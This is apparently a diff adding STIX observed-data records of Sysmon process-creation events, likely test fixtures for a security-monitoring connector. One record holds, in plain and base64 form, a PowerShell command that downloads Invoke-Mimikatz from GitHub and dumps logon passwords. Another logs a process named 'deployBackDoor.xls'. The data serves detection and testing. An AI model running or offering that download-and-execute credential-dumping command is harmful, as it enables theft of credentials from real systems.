Mg\nMTM6NTE6MTAuNTcwIFByb2Nlc3NHdWlkOiB7MUMyRDNGNTQtRkNDRS01RDk1LTAwMDAtMDAxMDc4\nRUIwQjAwfSBQcm9jZXNzSWQ6IDIyNTIgSW1hZ2U6IEM6XFdpbmRvd3NcU3lzdGVtMzJcV2luZG93\nc1Bvd2VyU2hlbGxcdjEuMFxwb3dlcnNoZWxsLmV4ZSBGaWxlVmVyc2lvbjogMTAuMC4xNDQwOS4x\nMDA1IChyczFfc3J2b29iLjE2MTIwOC0xMTU1KSBEZXNjcmlwdGlvbjogV2luZG93cyBQb3dlclNo\nZWxsIFByb2R1Y3Q6IE1pY3Jvc29mdMKuIFdpbmRvd3PCriBPcGVyYXRpbmcgU3lzdGVtIENvbXBh\nbnk6IE1pY3Jvc29mdCBDb3Jwb3JhdGlvbiBDb21tYW5kTGluZTogcG93ZXJzaGVsbCAiSUVYIChO\nZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRo\ndWJ1c2VyY29udGVudC5jb20vUG93ZXJTaGVsbE1hZmlhL1Bvd2VyU3Bsb2l0L21hc3Rlci9FeGZp\nbHRyYXRpb24vSW52b2tlLU1pbWlrYXR6LnBzMScpO0ludm9rZS1NaW1pa2F0eiAtQ29tbWFuZCAn\ncHJpdmlsZWdlOjpkZWJ1ZyBzZWt1cmxzYTo6bG9nb25wYXNzd29yZHMgZXhpdCciIEN1cnJlbnRE\naXJlY3Rvcnk6IEM6XFdpbmRvd3Ncc3lzdGVtMzJcIFVzZXI6IFdpblNlcnZlclxhZG1pbiBMb2dv\nbkd1aWQ6IHsxQzJEM0Y1NC1GNzM1LTVEOTUtMDAwMC0wMDIwOTQ2RDA0MDB9IExvZ29uSWQ6IDB4\nNDZkOTQgVGVybWluYWxTZXNzaW9uSWQ6IDEgSW50ZWdyaXR5TGV2ZWw6IEhpZ2ggSGFzaGVzOiBT\nSEExPUYzOTNEN0I1MzFDRDQ0Q0U0MTg2NDdGRTk1NzE1QURDM0UzQzYxRDIsTUQ1PUVCMzJDMDcw\nRTY1ODkzN0FBOUZBOUYzQUU2MjlCMkI4LFNIQTI1Nj03MEJBNTdGQjBCRjJGMzRCODY0MjZEMjE1\nNTlGNUY2RDA1QzEyNjgxOTM5MDRERThFOTU5RDdCMDZDRTk2NENFLElNUEhBU0g9QTREMzJGMUFF\nRjUyNUI4QURBNkEyNkYyODU5NkFDMkUgUGFyZW50UHJvY2Vzc0d1aWQ6IHsxQzJEM0Y1NC1GQTcy\nLTVEOTUtMDAwMC0wMDEwRTJFNjA5MDB9IFBhcmVudFByb2Nlc3NJZDogMTY2OCBQYXJlbnRJbWFn\nZTogQzpcV2luZG93c1xTeXN0ZW0zMlxjbWQuZXhlIFBhcmVudENvbW1hbmRMaW5lOiAiQzpcV2lu\nZG93c1xTeXN0ZW0zMlxjbWQuZXhlIiAK"
+		},
+		"6": {
+			"name": "powershell.exe",
+			"type": "file",
+			"hashes": {
+				"MD5": "EB32C070E658937AA9FA9F3AE629B2B8",
+				"imp": "A4D32F1AEF525B8ADA6A26F28596AC2E",
+				"SHA-1": "F393D7B531CD44CE418647FE95715ADC3E3C61D2",
+				"SHA-256": "70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE"
+			},
+			"parent_directory_ref": "8"
+		},
+		"7": {
+			"pid": 2252,
+			"name": "powershell.exe",
+			"type": "process",
+			"binary_ref": "6",
+			"command_line": "powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\""
+		},
+		"8": {
+			"path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+			"type": "directory"
+		}
+	},
+	"modified": "2020-10-16T17:19:32.132Z",
+	"last_observed": "2020-10-16T14:47:19.690Z",
+	"created_by_ref": "identity--bb6c2fac-61c4-4e59-bb38-a82c7f8d1fb1",
+	"first_observed": "2020-10-16T14:47:19.690Z",
+	"number_observed": 1,
+	"x_com_ibm_ariel": {
+		"qid": 5001828,
+		"qid_name": "Process Create",
+		"magnitude": 6,
+		"devicetype": 12,
+		"category_id": 19012,
+		"identity_ip": "0.0.0.0",
+		"utf8_payload": "<182>Oct 10 15:47:19 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94188\tTimeGenerated=1570110670\tTimeWritten=1570110670\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2020-10-16 13:51:10.570 ProcessGuid: {1C2D3F54-FCCE-5D95-0000-001078EB0B00} ProcessId: 2252 Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe FileVersion: 10.0.14409.1005 (rs1_srvoob.161208-1155) Description: Windows PowerShell Product: Microsoft® Windows® Operating System Company: Microsoft Corporation CommandLine: powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\" CurrentDirectory: C:\\Windows\\system32\\ User: BIGGUY LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=F393D7B531CD44CE418647FE95715ADC3E3C61D2,MD5=EB32C070E658937AA9FA9F3AE629B2B8,SHA256=70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE,IMPHASH=A4D32F1AEF525B8ADA6A26F28596AC2E ParentProcessGuid: {1C2D3F54-FA72-5D95-0000-0010E2E60900} ParentProcessId: 1668 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" \n",
+		"category_name": "Create Activity Succeeded    ",
+		"log_source_id": 112,
+		"log_source_name": "WinServer"
+	}
+},
+		{
+	"id": "observed-data--439c662d-5ddd-453f-afe4-1d00faf87531",
+	"type": "observed-data",
+	"created": "2020-10-16T17:19:31.981Z",
+	"objects": {
+		"0": {
+			"type": "ipv4-addr",
+			"value": "10.10.9.56",
+			"resolves_to_refs": "2"
+		},
+		"1": {
+			"type": "network-traffic",
+			"dst_ref": "3",
+			"src_ref": "0",
+			"dst_port": 0,
+			"src_port": 0,
+			"protocols": [
+				"reserved"
+			]
+		},
+		"2": {
+			"type": "mac-addr",
+			"value": "c0:00:00:00:27:43"
+		},
+		"3": {
+			"type": "ipv4-addr",
+			"value": "10.10.9.56",
+			"resolves_to_refs": "4"
+		},
+		"4": {
+			"type": "mac-addr",
+			"value": "c0:00:00:00:27:43"
+		},
+		"5": {
+			"type": "user-account",
+			"user_id": "Luis"
+		},
+		"6": {
+			"type": "artifact",
+			"payload_bin": "PDE4Mj5PY3QgMTQgMTk6NTc6NTkgMTkyLjE2OC4wLjkwIDwxMz5PY3QgMDMgMTQ6NTM6MzUgV2lu\nU2VydmVyIEFnZW50RGV2aWNlPVdpbmRvd3NMb2cJQWdlbnRMb2dGaWxlPU1pY3Jvc29mdC1XaW5k\nb3dzLVN5c21vbi9PcGVyYXRpb25hbAlQbHVnaW5WZXJzaW9uPTcuMi44LjE0NQlTb3VyY2U9TWlj\ncm9zb2Z0LVdpbmRvd3MtU3lzbW9uCUNvbXB1dGVyPVdpblNlcnZlcglPcmlnaW5hdGluZ0NvbXB1\ndGVyPVdpblNlcnZlcglVc2VyPVNZU1RFTQlEb21haW49TlQgQVVUSE9SSVRZCUV2ZW50SUQ9MQlF\ndmVudElEQ29kZT0xCUV2ZW50VHlwZT00CUV2ZW50Q2F0ZWdvcnk9MQlSZWNvcmROdW1iZXI9OTQy\nMTQJVGltZUdlbmVyYXRlZD0xNTcwMTEwODEzCVRpbWVXcml0dGVuPTE1NzAxMTA4MTMJTGV2ZWw9\nSW5mb3JtYXRpb25hbAlLZXl3b3Jkcz0weDgwMDAwMDAwMDAwMDAwMDAJVGFzaz1TeXNtb25UYXNr\nLVNZU01PTl9DUkVBVEVfUFJPQ0VTUwlPcGNvZGU9SW5mbwlNZXNzYWdlPVByb2Nlc3MgQ3JlYXRl\nOiBSdWxlTmFtZTogIFV0Y1RpbWU6IDIwMTktMTAtMDMgMTM6NTM6MzMuNTM4IFByb2Nlc3NHdWlk\nOiB7MUMyRDNGNTQtRkQ1RC01RDk1LTAwMDAtMDAxMEEwMkUwQzAwfSBQcm9jZXNzSWQ6IDc1NyBJ\nbWFnZTogQzpcUHJvZ3JhbSBGaWxlc1xBdGxhc3NpYW5cQ29uZmx1ZW5jZVxjNjQuZXhlIENvbW1h\nbmRMaW5lOiBjNjQuZXhlIGY2NC5kYXRhICI5ODM5RDdGMUEwIC1tIiBDdXJyZW50RGlyZWN0b3J5\nOiBDOlxXaW5kb3dzXCBVc2VyOiBXaW5TZXJ2ZXJcYWRtaW4gTG9nb25HdWlkOiB7MUMyRDNGNTQt\nRjczNS01RDk1LTAwMDAtMDAyMDk0NkQwNDAwfSBMb2dvbklkOiAweDQ2ZDk0IFRlcm1pbmFsU2Vz\nc2lvbklkOiAxIEludGVncml0eUxldmVsOiBIaWdoIEhhc2hlczogU0hBMT01YmY2Yzk4YTUyZTgw\nODI0ZDFhMjM0YmQ1ZTY3M2VkYjc1YzdkZGE5LE1ENT04NDZjZGI5MjE4NDFhYzY3MWM4NjM1MGQ0\nOTRhYmY5YyxTSEEyNTY9ZGM1MmJkZjVlM2Y3MWZiOWFiM2IxNzMwZDQ0NTI4N2QxNmQzYTNjOA=="
+		},
+		"7": {
+			"name": "deployBackDoor.xls",
+			"type": "file",
+			"hashes": {
+				"MD5": "b91ce2fa41029f6955bff20079468448",
+				"SHA-1": "76640508b1e7759e548771a5359eaed353bf1eec",
+				"SHA-256": "32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77"
+			},
+			"parent_directory_ref": "9"
+		},
+		"8": {
+			"pid": 757,
+			"name": "c64.exe",
+			"type": "process",
+			"binary_ref": "7",
+			"command_line": "deployBackDoor.xls f64.data \"9839D7F1A0 -m\""
+		},
+		"9": {
+			"path": "C:\\Program Files\\Atlassian\\Confluence\\deployBackDoor.xls",
+			"type": "directory"
+		}
+	},
+	"modified": "2020-10-16T17:19:31.981Z",
+	"last_observed": "2020-10-16T20:58:00.151Z",
+	"created_by_ref": "identity--bb6c2fac-61c4-4e59-bb38-a82c7f8d1fb1",
+	"first_observed": "2020-10-16T20:58:00.151Z",
+	"number_observed": 1,
+	"x_com_ibm_ariel": {
+		"qid": 5001828,
+		"qid_name": "Process Create backdoor",
+		"magnitude": 2,
+		"devicetype": 12,
+		"category_id": 19012,
+		"identity_ip": "0.0.0.0",
+		"utf8_payload": "<182>Jan 03 19:57:59 10.10.9.56 <13>Jan 03 14:53:35 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94214\tTimeGenerated=1570110813\tTimeWritten=1570110813\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2020-10-16 13:53:33.538 ProcessGuid: {1C2D3F54-FD5D-5D95-0000-0010A02E0C00} ProcessId: 757 Image: C:\\Program Files\\Atlassian\\Confluence\\c64.exe CommandLine: c64.exe f64.data \"9839D7F1A0 -m\" CurrentDirectory: C:\\Windows\\ User: BIGGUY LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=5bf6c98a52e80824d1a234bd5e673edb75c7dda9,MD5=846cdb921841ac671c86350d494abf9c,SHA256=dc52bdf5e3f71fb9ab3b1730d445287d16d3a3c8",
+		"category_name": "Create Activity Succeeded    ",
+		"log_source_id": 1912,
+		"log_source_name": "Sysmon @ 10.10.9.56"
+	}
+},
+{
+	"id": "observed-data--e7fb9739-0279-4b0e-be23-acab160ab778",
+	"type": "observed-data",
+	"created": "2021-01-14T21:31:36.141Z",
+	"objects": {
+		"0": {
+			"code": 1,
+			"type": "x-oca-event",
+			"agent": "WindowsAuthServer @ ALONFREUND-1865",
+			"action": "Process Create",
+			"nt_ref": "4",
+			"created": "2021-01-14T12:34:36.000Z",
+			"outcome": "Process Creation Success",
+			"category": [
+				"System"
+			],
+			"file_ref": "13",
+			"host_ref": "5",
+			"provider": "Microsoft Windows Security Event Log",
+			"user_ref": "9",
+			"process_ref": "10",
+			"original_ref": "12",
+			"parent_process_ref": "18"
+		},
+		"1": {
+			"qid": 5001828,
+			"type": "x-qradar",
+			"direction": "R2R",
+			"domain_id": 0,
+			"relevance": 1,
+			"category_id": 8110,
+			"credibility": 5,
+			"device_type": 12,
+			"domain_name": "Default Domain",
+			"log_source_id": 212,
+			"cre_event_list": [
+				"100265",
+				"100221",
+				"101204",
+				"101432",
+				"101012",
+				"100272",
+				"100647",
+				"100227"
+			],
+			"high_level_category_id": 8000
+		},
+		"2": {
+			"end": "2021-01-14T12:34:37.881Z",
+			"type": "x-ibm-finding",
+			"start": "2021-01-14T12:34:37.881Z",
+			"severity": 2,
+			"magnitude": 2,
+			"dst_ip_ref": "7",
+			"rule_names": [
+				"BB:DeviceDefinition: Operating System",
+				"Destination Asset Weight is Low",
+				"ECBB:CategoryDefinition: Destination IP is a Third Country/Region",
+				"BB:CategoryDefinition: Source IP is a Third Country/Region",
+				"QVTI: Populate Hashes to Check",
+				"Load Basic Building Blocks",
+				"BB:CategoryDefinition: Process Creation Event",
+				"Source Asset Weight is Low"
+			],
+			"src_ip_ref": "3",
+			"event_count": 2,
+			"finding_type": "event",
+			"dst_geolocation": "NorthAmerica.UnitedStates",
+			"src_geolocation": "NorthAmerica.UnitedStates",
+			"src_application_user_ref": "9"
+		},
+		"3": {
+			"type": "ipv4-addr",
+			"value": "9.145.65.128",
+			"resolves_to_refs": [
+				"6"
+			]
+		},
+		"4": {
+			"type": "network-traffic",
+			"dst_ref": "7",
+			"src_ref": "3",
+			"dst_port": 0,
+			"src_port": 0,
+			"protocols": [
+				"reserved"
+			]
+		},
+		"5": {
+			"type": "x-oca-asset",
+			"ip_refs": [
+				"3",
+				"11"
+			],
+			"mac_refs": [
+				"6"
+			]
+		},
+		"6": {
+			"type": "mac-addr",
+			"value": "00:00:00:00:00:00"
+		},
+		"7": {
+			"type": "ipv4-addr",
+			"value": "9.145.65.128",
+			"resolves_to_refs": [
+				"8"
+			]
+		},
+		"8": {
+			"type": "mac-addr",
+			"value": "00:00:00:00:00:00"
+		},
+		"9": {
+			"type": "user-account",
+			"user_id": "SYSTEM"
+		},
+		"10": {
+			"pid": 21812,
+			"name": "svchost.exe",
+			"type": "process",
+			"binary_ref": "14",
+			"parent_ref": "18",
+			"command_line": "C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p -s dmwappushservice",
+			"creator_user_ref": "9"
+		},
+		"11": {
+			"type": "ipv4-addr",
+			"value": "0.0.0.0"
+		},
+		"12": {
+			"type": "artifact",
+			"payload_bin": "PDEzPkphbiAxNCAxNDozNDozOSBBTE9ORlJFVU5ELTE4NjUgQWdlbnREZXZpY2U9V2luZG93c0xvZwlBZ2VudExvZ0ZpbGU9TWljcm9zb2Z0LVdpbmRvd3MtU3lzbW9uL09wZXJhdGlvbmFsCVBsdWdpblZlcnNpb249Ny4yLjkuNzIJU291cmNlPU1pY3Jvc29mdC1XaW5kb3dzLVN5c21vbglDb21wdXRlcj1BTE9ORlJFVU5ELTE4NjVTREUJT3JpZ2luYXRpbmdDb21wdXRlcj1BTE9ORlJFVU5ELTE4NjVTREUJVXNlcj1TWVNURU0JRG9tYWluPU5UIEFVVEhPUklUWQlFdmVudElEPTEJRXZlbnRJRENvZGU9MQlFdmVudFR5cGU9NAlFdmVudENhdGVnb3J5PTEJUmVjb3JkTnVtYmVyPTE4NjE3MjAJVGltZUdlbmVyYXRlZD0xNjEwNjI3Njc2CVRpbWVXcml0dGVuPTE2MTA2Mjc2NzYJTGV2ZWw9SW5mb3JtYXRpb25hbAlLZXl3b3Jkcz0weDgwMDAwMDAwMDAwMDAwMDAJVGFzaz1TeXNtb25UYXNrLVNZU01PTl9DUkVBVEVfUFJPQ0VTUwlPcGNvZGU9SW5mbwlNZXNzYWdlPVByb2Nlc3MgQ3JlYXRlOiBSdWxlTmFtZTogLSBVdGNUaW1lOiAyMDIxLTAxLTE0IDEyOjM0OjM2LjQ4MSBQcm9jZXNzR3VpZDogezI1M2FjZjY3LTNhNWMtNjAwMC02ZTcwLTAxMDAwMDAwMGIwMH0gUHJvY2Vzc0lkOiAyMTgxMiBJbWFnZTogQzpcV2luZG93c1xTeXN0ZW0zMlxzdmNob3N0LmV4ZSBGaWxlVmVyc2lvbjogMTAuMC4xOTA0MS41NDYgKFdpbkJ1aWxkLjE2MDEwMS4wODAwKSBEZXNjcmlwdGlvbjogSG9zdCBQcm9jZXNzIGZvciBXaW5kb3dzIFNlcnZpY2VzIFByb2R1Y3Q6IE1pY3Jvc29mdMKuIFdpbmRvd3PCriBPcGVyYXRpbmcgU3lzdGVtIENvbXBhbnk6IE1pY3Jvc29mdCBDb3Jwb3JhdGlvbiBPcmlnaW5hbEZpbGVOYW1lOiBzdmNob3N0LmV4ZSBDb21tYW5kTGluZTogQzpcV0lORE9XU1xzeXN0ZW0zMlxzdmNob3N0LmV4ZSAtayBuZXRzdmNzIC1wIC1zIGRtd2FwcHVzaHNlcnZpY2UgQ3VycmVudERpcmVjdG9yeTogQzpcV0lORE9XU1xzeXN0ZW0zMlwgVXNlcjogTlQgQVVUSE9SSVRZXFNZU1RFTSBMb2dvbkd1aWQ6IHsyNTNhY2Y2Ny0yMDU5LTVmZTUtZTcwMy0wMDAwMDAwMDAwMDB9IExvZ29uSWQ6IDB4M0U3IFRlcm1pbmFsU2Vzc2lvbklkOiAwIEludGVncml0eUxldmVsOiBTeXN0ZW0gSGFzaGVzOiBNRDU9RjU4NjgzNTA4MkY2MzJEQzhEOTQwNEQ4M0JDMTYzMTYsU0hBMjU2PTY0M0VDNThFODJFMDI3MkM5N0MyQTU5RjYwMjA5NzBEODgxQUYxOUMwQUQ1MDI5REI5Qzk1OEMxM0I2NTU4QzcsSU1QSEFTSD1GOUJCRDk2RkFFNTNCN0EzMTI2NEE3MDNDQUZBMDY2NiBQYXJlbnRQcm9jZXNzR3VpZDogezI1M2FjZjY3LTIwNTktNWZlNS0wYzAwLTAwMDAwMDAwMGIwMH0gUGFyZW50UHJvY2Vzc0lkOiA4NTYgUGFyZW50SW1hZ2U6IEM6XFdpbmRvd3NcU3lzdGVtMzJcc2VydmljZXMuZXhlIFBhcmVudENvbW1hbmRMaW5lOiBDOlxXSU5ET1dTXHN5c3RlbTMyXHNlcnZpY2VzLmV4ZQo="
+		},
+		"13": {
+			"type": "file",
+			"hashes": {
+				"MD5": "F586835082F632DC8D9404D83BC16316"
+			}
+		},
+		"14": {
+			"name": "svchost.exe",
+			"type": "file",
+			"parent_directory_ref": "15"
+		},
+		"15": {
+			"path": "C:\\Windows\\System32",
+			"type": "directory"
+		},
+		"16": {
+			"name": "services.exe",
+			"type": "file",
+			"parent_directory_ref": "17"
+		},
+		"17": {
+			"path": "C:\\Windows\\System32",
+			"type": "directory"
+		},
+		"18": {
+			"pid": 856,
+			"type": "process",
+			"binary_ref": "16",
+			"command_line": "C:\\WINDOWS\\system32\\services.exe"
+		},
+		"19": {
+			"type": "x-ibm-windows",
+			"imphash": "F9BBD96FAE53B7A31264A703CAFA0666"
+		}
+	},
+	"modified": "2021-01-14T21:31:36.141Z",
+	"last_observed": "2021-01-14T12:34:37.881Z",
+	"created_by_ref": "identity--271bd595-0776-42ec-8306-99d595d718c0",
+	"first_observed": "2021-01-14T12:34:37.881Z",
+	"number_observed": 2
+},
+		
+		
+		
+		}
+	]
+}
